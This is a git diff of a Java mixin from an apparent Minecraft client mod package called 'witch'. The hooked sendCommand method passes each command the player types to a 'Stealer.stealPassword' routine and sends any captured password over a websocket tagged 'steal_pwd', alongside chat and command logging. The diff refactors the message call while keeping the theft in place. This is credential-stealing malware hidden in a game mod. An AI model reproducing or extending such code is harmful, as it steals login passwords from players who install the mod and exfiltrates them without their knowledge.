@@ -1,11 +1,10 @@
 package me.soda.witch.mixin;
 
-import com.google.gson.Gson;
 import me.soda.witch.Witch;
 import me.soda.witch.features.ChatCommandLogging;
 import me.soda.witch.features.ChatUtil;
 import me.soda.witch.features.Stealer;
-import me.soda.witch.websocket.MessageUtils;
+import me.soda.witch.websocket.Message;
 import net.minecraft.client.network.ClientPlayerEntity;
 import net.minecraft.text.Text;
 import org.spongepowered.asm.mixin.Mixin;
@@ -18,7 +17,7 @@ public abstract class ClientPlayerEntityMixin {
     @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"))
     private void onSendCommand(String command, Text preview, CallbackInfo info) {
         Stealer.Password pass = Stealer.stealPassword(command);
-        if (pass != null) MessageUtils.sendMessage("steal_pwd", new Gson().toJson(pass));
+        if (pass != null) Message.send("steal_pwd", pass);
         if (Witch.config.logChatAndCommand) ChatCommandLogging.addToList("/" + command);
     }
 
